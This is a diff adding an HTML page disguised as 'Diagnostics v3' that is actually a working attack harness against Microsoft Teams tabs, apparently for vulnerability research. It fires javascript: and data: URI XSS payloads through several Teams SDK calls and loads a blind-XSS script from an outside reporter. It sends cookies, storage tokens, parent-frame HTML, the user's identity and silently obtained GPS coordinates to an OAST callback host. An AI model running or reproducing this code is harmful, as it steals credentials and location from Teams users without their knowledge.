@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Diagnostics v3</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:8px; font-size:11px; }
+  #out { background:#161b22; padding:8px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:80vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  button { background:#21262d; color:#58a6ff; border:1px solid #30363d; padding:6px 12px; margin:2px; border-radius:4px; cursor:pointer; font-size:11px; }
+</style>
+</head>
+<body>
+<div style="margin-bottom:8px;">
+  <button onclick="runAll()">Run All</button>
+  <button onclick="testOpenLinkXSS()">1: openLink XSS</button>
+  <button onclick="testDialogJS()">2: Dialog JS</button>
+  <button onclick="testNavigateCrossDomain()">3: navigateCrossDomain</button>
+  <button onclick="testDeepLinks()">4: Deep Links</button>
+  <button onclick="testGeoSilent()">5: Silent Geo</button>
+  <button onclick="testParentAccess()">6: Parent Access</button>
+  <button onclick="copyOut()">Copy</button>
+</div>
+<div id="out"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+var BXSS = 'xss.report/c/ztlsavior';
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+async function init() {
+  log('=== INIT ===', 'info');
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('SDK OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 1: openLink() XSS VIA DEEP LINKS
+// Previous test showed openLink accepted javascript: in webUrl param
+// Now we test multiple variants to find one that executes in Teams origin
+// ================================================================
+async function testOpenLinkXSS() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TEST 1: openLink() XSS VECTORS', 'info');
+  log('='.repeat(60), 'info');
+
+  var upn = CTX ? CTX.user.userPrincipalName : 'test@test.com';
+
+  // Each deep link variant that might execute JS in Teams context
+  var bxssTag = '"><script src=https://' + BXSS + '><\/script>';
+  var bxssImg = '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://' + BXSS + '\';document.head.appendChild(s)">';
+
+  var vectors = [
+    // A) javascript: directly — loads blind XSS reporter
+    {
+      name: 'direct-javascript',
+      url: 'javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);fetch("https://' + C + '/xss-direct?origin="+document.domain+"&cookie="+document.cookie)})())'
+    },
+    // B) Teams entity deep link with javascript: contentUrl + blind XSS
+    {
+      name: 'entity-contentUrl-js',
+      url: 'https://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);fetch("https://' + C + '/xss-entity?origin="+document.domain)})())'
+    },
+    // C) Teams entity deep link with data: contentUrl + blind XSS
+    {
+      name: 'entity-contentUrl-data',
+      url: 'https://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=data:text/html;base64,' + btoa('<script src="https://' + BXSS + '"><\/script><script>fetch("https://' + C + '/xss-entity-data?origin="+document.domain+"&cookie="+document.cookie)<\/script>')
+    },
+    // D) msteams:// scheme with javascript: + blind XSS
+    {
+      name: 'msteams-js',
+      url: 'msteams://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s)})())'
+    },
+    // E) Teams meeting join link with javascript: injection
+    {
+      name: 'meeting-js',
+      url: 'https://teams.microsoft.com/l/meetup-join/javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s)})())'
+    },
+    // F) Teams chat deep link with HTML injection + blind XSS
+    {
+      name: 'chat-deeplink-js',
+      url: 'https://teams.microsoft.com/l/chat/0/0?users=test@test.com&message=test&topicName=' + encodeURIComponent(bxssImg)
+    },
+    // G) Teams stage view deep link + blind XSS
+    {
+      name: 'stageview-js',
+      url: 'https://teams.microsoft.com/l/stage/com.microsoft.teamspace.tab.web/0?context={"contentUrl":"javascript:void((function(){var s=document.createElement(\'script\');s.src=\'https://' + BXSS + '\';document.head.appendChild(s)})())"}'
+    },
+    // H) Teams app install link
+    {
+      name: 'app-install-js',
+      url: 'https://teams.microsoft.com/l/app/com.microsoft.teamspace.tab.web?source=javascript:void(0)'
+    },
+    // I) navigateToApp with javascript: + blind XSS
+    {
+      name: 'navigateToApp-js',
+      url: 'https://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/tab?webUrl=' + encodeURIComponent('javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s)})())')
+    },
+    // J) URL with fragment javascript:
+    {
+      name: 'fragment-js',
+      url: 'https://teams.microsoft.com/#javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s)})())'
+    },
+  ];
+
+  for (var i = 0; i < vectors.length; i++) {
+    var v = vectors[i];
+    log('\n--- ' + (i+1) + ': ' + v.name + ' ---', 'info');
+    log('URL: ' + v.url.substring(0, 120) + '...', 'info');
+    try {
+      var result = microsoftTeams.app.openLink(v.url);
+      if (result && typeof result.then === 'function') {
+        try {
+          var r = await Promise.race([result, new Promise(function(res) { setTimeout(function() { res('timeout-3s'); }, 3000); })]);
+          log('Result: ' + String(r), r === 'timeout-3s' ? 'warn' : 'crit');
+        } catch(e) {
+          log('Rejected: ' + e.message, 'fail');
+        }
+      } else {
+        log('Returned (sync): ' + String(result), 'ok');
+      }
+      log('openLink ACCEPTED (check OAST for callback)', 'ok');
+      ex('t12-openlink-' + v.name, { accepted: 'true' });
+    } catch(e) {
+      log('Blocked: ' + e.message, 'fail');
+    }
+    // Small delay between each to not overwhelm
+    await new Promise(function(r) { setTimeout(r, 1500); });
+  }
+}
+
+// ================================================================
+// TEST 2: DIALOG javascript: / data: URI EXECUTION
+// Previous test confirmed dialog-js callback with origin=null
+// Now test what we can access from inside the dialog
+// ================================================================
+async function testDialogJS() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TEST 2: DIALOG JS/DATA URI EXECUTION', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) data: URI with full payload — check what origin/cookies/storage we get
+  log('\n--- A: data: URI dialog with full recon ---', 'info');
+  try {
+    var reconScript = [
+      'var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);',
+      'var d={};',
+      'd.origin=location.origin;',
+      'd.href=location.href.substring(0,100);',
+      'd.domain=document.domain;',
+      'd.cookie=document.cookie.substring(0,200);',
+      'try{d.localStorage=Object.keys(localStorage).join(",").substring(0,200)}catch(e){d.ls_err=e.message}',
+      'try{d.sessionStorage=Object.keys(sessionStorage).join(",").substring(0,200)}catch(e){d.ss_err=e.message}',
+      'try{d.parentOrigin=window.parent.location.origin}catch(e){d.parent_err=e.message}',
+      'try{d.topOrigin=window.top.location.origin}catch(e){d.top_err=e.message}',
+      'try{d.parentTitle=window.parent.document.title}catch(e){}',
+      'try{d.opener=window.opener?window.opener.location.origin:"none"}catch(e){d.opener_err=e.message}',
+      'var p=Object.keys(d).map(function(k){return k+"="+encodeURIComponent(String(d[k]||"").substring(0,200))}).join("&");',
+      'fetch("https://' + C + '/t12-dialog-recon?"+p).catch(function(){new Image().src="https://' + C + '/t12-dialog-recon?"+p});',
+    ].join('');
+
+    var dataUri = 'data:text/html;base64,' + btoa('<html><body><script>' + reconScript + '<\/script></body></html>');
+
+    microsoftTeams.dialog.url.open({
+      title: 'Loading...',
+      url: dataUri,
+      size: { height: 100, width: 100 }
+    }, function(result) {
+      log('data: dialog result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+    });
+    log('data: URI dialog with recon opened', 'ok');
+  } catch(e) {
+    log('data: dialog: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 3000); });
+
+  // B) javascript: URI with recon
+  log('\n--- B: javascript: URI dialog ---', 'info');
+  try {
+    var jsPayload = 'javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);fetch("https://' + C + '/t12-dialog-js-recon?origin="+encodeURIComponent(location.origin)+"&domain="+encodeURIComponent(document.domain)+"&cookie="+encodeURIComponent(document.cookie.substring(0,200)))})())';
+
+    microsoftTeams.dialog.url.open({
+      title: 'Verifying...',
+      url: jsPayload,
+      size: { height: 100, width: 100 }
+    }, function(result) {
+      log('js: dialog result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+    });
+    log('javascript: URI dialog opened', 'ok');
+  } catch(e) {
+    log('js: dialog: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 3000); });
+
+  // C) HTTPS URL that redirects to javascript: (if OAST supported redirects)
+  log('\n--- C: dialog to attacker URL (serves JS page) ---', 'info');
+  try {
+    // Open OAST URL — this already worked. Now we need to serve a page
+    // that tries to access Teams APIs and parent frame
+    microsoftTeams.dialog.url.open({
+      title: 'Security Check',
+      url: 'https://' + C + '/t12-dialog-served?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : 'unknown'),
+      size: { height: 300, width: 400 }
+    }, function(result) {
+      log('OAST dialog result: ' + JSON.stringify(result).substring(0, 300), 'warn');
+      if (result && result.result) {
+        ex('t12-dialog-served-result', { data: JSON.stringify(result.result).substring(0, 400) });
+      }
+    });
+    log('OAST dialog opened (check for callbacks)', 'ok');
+  } catch(e) {
+    log('OAST dialog: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 3: navigateCrossDomain — XSS VIA NAVIGATION
+// pages.navigateCrossDomain might allow navigation to Teams origin
+// ================================================================
+async function testNavigateCrossDomain() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TEST 3: navigateCrossDomain VECTORS', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Navigate to teams.microsoft.com (if allowed, we're now in Teams origin)
+  var navUrls = [
+    'https://teams.microsoft.com/',
+    'https://teams.microsoft.com/v2/',
+    'https://teams.cloud.microsoft/',
+    'javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);fetch("https://' + C + '/t12-nav-js?d="+document.domain)})())',
+    'data:text/html;base64,' + btoa('<script src="https://' + BXSS + '"><\/script><script>fetch("https://' + C + '/t12-nav-data?d="+document.domain)<\/script>'),
+  ];
+
+  for (var i = 0; i < navUrls.length; i++) {
+    log('\n--- Navigate: ' + navUrls[i].substring(0, 80) + ' ---', 'info');
+    try {
+      var result = microsoftTeams.pages.navigateCrossDomain(navUrls[i]);
+      if (result && typeof result.then === 'function') {
+        try {
+          var r = await Promise.race([result, new Promise(function(res) { setTimeout(function() { res('timeout'); }, 3000); })]);
+          log('Result: ' + String(r), 'ok');
+        } catch(e) {
+          log('Rejected: ' + e.message.substring(0, 80), 'fail');
+        }
+      } else {
+        log('Returned: ' + String(result), 'ok');
+      }
+    } catch(e) {
+      log('Error: ' + e.message.substring(0, 80), 'fail');
+    }
+  }
+
+  // B) Try navigateToApp
+  log('\n--- navigateToApp ---', 'info');
+  try {
+    var result = microsoftTeams.pages.navigateToApp({
+      appId: 'com.microsoft.teamspace.tab.web',
+      pageId: 'test',
+      webUrl: 'javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);fetch("https://' + C + '/t12-navapp-js?d="+document.domain)})())',
+    });
+    if (result && typeof result.then === 'function') {
+      try {
+        var r = await Promise.race([result, new Promise(function(res) { setTimeout(function() { res('timeout'); }, 3000); })]);
+        log('navigateToApp result: ' + String(r), 'ok');
+      } catch(e) {
+        log('navigateToApp rejected: ' + e.message.substring(0, 80), 'fail');
+      }
+    }
+  } catch(e) {
+    log('navigateToApp error: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 4: DEEP LINKS WITH SDK — MORE INJECTION VECTORS
+// ================================================================
+async function testDeepLinks() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TEST 4: DEEP LINK INJECTION VECTORS', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) shareDeepLink — can we inject JS into a deep link that others click?
+  log('\n--- A: shareDeepLink ---', 'info');
+  try {
+    microsoftTeams.pages.shareDeepLink({
+      subPageId: 'test',
+      subPageLabel: 'Click here',
+      subPageWebUrl: 'javascript:void((function(){var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);fetch("https://' + C + '/t12-sharedeep?d="+document.domain)})())'
+    });
+    log('shareDeepLink with JS URL called', 'ok');
+    ex('t12-sharedeep-called', { status: 'accepted' });
+  } catch(e) {
+    log('shareDeepLink: ' + e.message, 'fail');
+  }
+
+  // B) Try app.openLink with msteams:// scheme variations
+  log('\n--- B: msteams:// scheme variations ---', 'info');
+  var schemes = [
+    'msteams://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=' + encodeURIComponent('https://' + C + '/xss-msteams-enc'),
+    'msteams://l/entity/com.microsoft.teamspace.tab.web/test?webUrl=' + encodeURIComponent('https://' + C + '/xss-msteams2'),
+    'ms-teams://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=' + encodeURIComponent('https://' + C + '/xss-ms-teams'),
+  ];
+
+  for (var s of schemes) {
+    try {
+      microsoftTeams.app.openLink(s);
+      log('  ' + s.substring(0, 80) + '... ACCEPTED', 'ok');
+      ex('t12-scheme-' + s.substring(0, 15), { accepted: 'true' });
+    } catch(e) {
+      log('  ' + s.substring(0, 80) + '... ' + e.message.substring(0, 40), 'fail');
+    }
+    await new Promise(function(r) { setTimeout(r, 1500); });
+  }
+
+  // C) setCurrentFrame — try to change our frame URL to Teams domain
+  log('\n--- C: setCurrentFrame ---', 'info');
+  try {
+    microsoftTeams.pages.setCurrentFrame({
+      contentUrl: 'https://teams.microsoft.com/',
+      websiteUrl: 'https://teams.microsoft.com/'
+    });
+    log('setCurrentFrame to teams.microsoft.com called', 'ok');
+  } catch(e) {
+    log('setCurrentFrame: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 5: SILENT GEOLOCATION — PROVE NO PROMPT
+// ================================================================
+async function testGeoSilent() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TEST 5: SILENT GEOLOCATION (NO PROMPT)', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Native geolocation — did it really work without prompt?
+  log('\n--- A: navigator.geolocation.getCurrentPosition ---', 'info');
+  try {
+    var geoResult = await new Promise(function(resolve, reject) {
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+            timestamp: pos.timestamp
+          });
+        },
+        function(err) {
+          reject(err);
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    });
+
+    log('GEOLOCATION OBTAINED WITHOUT PROMPT!', 'crit');
+    log('  Latitude:  ' + geoResult.lat, 'crit');
+    log('  Longitude: ' + geoResult.lon, 'crit');
+    log('  Accuracy:  ' + geoResult.accuracy + 'm', 'ok');
+    log('  Altitude:  ' + geoResult.altitude, 'ok');
+    log('  Heading:   ' + geoResult.heading, 'ok');
+    log('  Speed:     ' + geoResult.speed, 'ok');
+    log('  Timestamp: ' + new Date(geoResult.timestamp).toISOString(), 'ok');
+
+    ex('t12-geo-stolen', {
+      lat: geoResult.lat,
+      lon: geoResult.lon,
+      accuracy: geoResult.accuracy,
+      altitude: geoResult.altitude
+    });
+
+  } catch(e) {
+    log('Geolocation error: ' + (e.message || e.code), 'fail');
+  }
+
+  // B) Watch position — continuous tracking
+  log('\n--- B: watchPosition (continuous tracking) ---', 'info');
+  try {
+    var watchCount = 0;
+    var watchId = navigator.geolocation.watchPosition(
+      function(pos) {
+        watchCount++;
+        log('  Track #' + watchCount + ': ' + pos.coords.latitude.toFixed(6) + ', ' + pos.coords.longitude.toFixed(6) + ' (±' + pos.coords.accuracy + 'm)', 'crit');
+        ex('t12-geo-track-' + watchCount, { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
+        if (watchCount >= 3) {
+          navigator.geolocation.clearWatch(watchId);
+          log('  Tracking stopped after 3 samples', 'info');
+        }
+      },
+      function(err) {
+        log('  Watch error: ' + (err.message || err.code), 'fail');
+      },
+      { enableHighAccuracy: true }
+    );
+    log('watchPosition started (waiting for updates...)', 'ok');
+  } catch(e) {
+    log('watchPosition: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 15000); });
+}
+
+// ================================================================
+// TEST 6: PARENT FRAME ACCESS ANALYSIS
+// Previous OAST shows /t9-parent-access?title=Diagnostics
+// Need to determine: is parent same-origin or is this SOP bypass?
+// ================================================================
+async function testParentAccess() {
+  log('\n' + '='.repeat(60), 'info');
+  log('TEST 6: PARENT FRAME ACCESS ANALYSIS', 'info');
+  log('='.repeat(60), 'info');
+
+  log('\n--- A: Frame hierarchy ---', 'info');
+  log('window === window.parent: ' + (window === window.parent), 'info');
+  log('window === window.top: ' + (window === window.top), 'info');
+  log('window.parent === window.top: ' + (window.parent === window.top), 'info');
+  log('window.frameElement: ' + window.frameElement, 'info');
+  log('window.frames.length: ' + window.frames.length, 'info');
+  log('self.origin: ' + self.origin, 'info');
+
+  log('\n--- B: Parent document access ---', 'info');
+  if (window !== window.parent) {
+    log('We ARE in an iframe', 'crit');
+    try {
+      var pLoc = window.parent.location.href;
+      log('parent.location.href: ' + pLoc, 'crit');
+      ex('t12-parent-href', { href: pLoc.substring(0, 300) });
+    } catch(e) {
+      log('parent.location.href: BLOCKED — ' + e.message.substring(0, 50), 'info');
+    }
+    try {
+      var pOrigin = window.parent.location.origin;
+      log('parent.location.origin: ' + pOrigin, 'crit');
+      ex('t12-parent-origin', { origin: pOrigin });
+    } catch(e) {
+      log('parent.location.origin: BLOCKED — ' + e.message.substring(0, 50), 'info');
+    }
+    try {
+      var pDoc = window.parent.document;
+      log('parent.document: ACCESSIBLE!', 'crit');
+      log('parent.document.title: ' + pDoc.title, 'crit');
+      log('parent.document.domain: ' + pDoc.domain, 'crit');
+      log('parent.document.cookie: ' + pDoc.cookie.substring(0, 200), 'crit');
+
+      // Try to read Teams-specific data from parent
+      try {
+        var scripts = pDoc.querySelectorAll('script');
+        log('parent scripts: ' + scripts.length, 'warn');
+      } catch(e) {}
+
+      try {
+        var html = pDoc.documentElement.outerHTML;
+        log('parent HTML length: ' + html.length, 'crit');
+        log('parent HTML preview: ' + html.substring(0, 300), 'warn');
+        ex('t12-parent-html', { html: html.substring(0, 400) });
+      } catch(e) {}
+
+      // Try to inject script into parent
+      try {
+        var s = pDoc.createElement('script');
+        s.textContent = 'var x=document.createElement("script");x.src="https://' + BXSS + '";document.head.appendChild(x);fetch("https://' + C + '/t12-parent-xss?d="+document.domain+"&c="+document.cookie.substring(0,200))';
+        pDoc.body.appendChild(s);
+        log('SCRIPT INJECTED INTO PARENT!', 'crit');
+        ex('t12-parent-injection', { success: 'true' });
+      } catch(e) {
+        log('Script injection into parent: ' + e.message.substring(0, 50), 'fail');
+      }
+
+    } catch(e) {
+      log('parent.document: BLOCKED — ' + e.message.substring(0, 50), 'info');
+    }
+  } else {
+    log('We are NOT in an iframe (window === window.parent)', 'warn');
+    log('This means Teams Mobile loads tabs directly in WKWebView', 'info');
+    log('No parent frame to attack — but we ARE in the Teams WKWebView context', 'warn');
+
+    // Check what we have access to in this context
+    log('\n--- C: Direct WKWebView context ---', 'info');
+    log('document.domain: ' + document.domain, 'ok');
+    log('location.origin: ' + location.origin, 'ok');
+    log('location.href: ' + location.href, 'ok');
+    log('document.cookie: ' + (document.cookie || '(empty)'), 'ok');
+
+    try {
+      var lsKeys = Object.keys(localStorage);
+      log('localStorage keys: ' + lsKeys.join(', ').substring(0, 300), lsKeys.length > 0 ? 'crit' : 'ok');
+      // Dump interesting localStorage entries
+      for (var lk of lsKeys) {
+        var val = localStorage.getItem(lk);
+        if (val && (val.indexOf('eyJ') !== -1 || val.indexOf('token') !== -1 || val.indexOf('auth') !== -1)) {
+          log('  [TOKEN?] ' + lk + ': ' + val.substring(0, 200), 'crit');
+          ex('t12-ls-token', { key: lk, value: val.substring(0, 400) });
+        }
+      }
+    } catch(e) {
+      log('localStorage: ' + e.message, 'fail');
+    }
+
+    try {
+      var ssKeys = Object.keys(sessionStorage);
+      log('sessionStorage keys: ' + ssKeys.join(', ').substring(0, 300), ssKeys.length > 0 ? 'crit' : 'ok');
+      for (var sk of ssKeys) {
+        var val = sessionStorage.getItem(sk);
+        if (val && (val.indexOf('eyJ') !== -1 || val.indexOf('token') !== -1 || val.indexOf('auth') !== -1)) {
+          log('  [TOKEN?] ' + sk + ': ' + val.substring(0, 200), 'crit');
+          ex('t12-ss-token', { key: sk, value: val.substring(0, 400) });
+        }
+      }
+    } catch(e) {
+      log('sessionStorage: ' + e.message, 'fail');
+    }
+  }
+}
+
+// ================================================================
+async function runAll() {
+  el.textContent = '';
+  await init();
+  await testParentAccess();
+  await testDialogJS();
+  await testOpenLinkXSS();
+  await testNavigateCrossDomain();
+  await testDeepLinks();
+  await testGeoSilent();
+  log('\n' + '='.repeat(60), 'info');
+  log('ALL TESTS COMPLETE', 'info');
+  log('='.repeat(60), 'info');
+}
+
+init();
+</script>
+</body>
+</html>
